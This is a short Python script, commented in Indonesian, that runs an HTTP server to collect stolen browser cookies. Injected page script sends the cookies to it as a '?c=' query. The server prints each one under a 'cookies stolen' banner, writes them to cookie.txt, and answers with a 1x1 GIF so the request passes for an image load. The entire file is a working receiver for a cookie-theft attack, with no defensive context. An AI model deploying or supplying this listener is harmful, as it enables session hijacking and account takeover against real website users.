# server.py - menampilkan semua cookie dengan rapi
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, unquote

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.query:
            # Decode URL encoding
            decoded = unquote(parsed.query)
            
            # Hapus prefix "c=" jika ada (kita kirim '?c=' + cookie)
            if decoded.startswith('c='):
                cookie_string = decoded[2:]
            else:
                cookie_string = decoded
            
            # Pisahkan cookie berdasarkan "; " (standar format cookie)
            cookies = cookie_string.split('; ')
            
            print("\n" + "="*60)
            print("[✓] COOKIE DICURI (LENGKAP)!")
            print("="*60)
            
            # Tampilkan setiap cookie per baris
            for cookie in cookies:
                if '=' in cookie:
                    key, value = cookie.split('=', 1)
                    print(f"{key}: {value}")
                else:
                    print(cookie)
            
            print("="*60)
            
            # Simpan ke file (raw string tanpa 'c=')
            with open("cookie.txt", "w") as f:
                f.write(cookie_string)
        
        # Response gambar 1x1 pixel GIF valid
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.end_headers()
        self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
    
    def log_message(self, format, *args):
        pass  # matikan log default

if __name__ == '__main__':
    print("[*] Server berjalan di http://localhost:8000")
    print("[*] Menunggu cookie dikirim...")
    HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
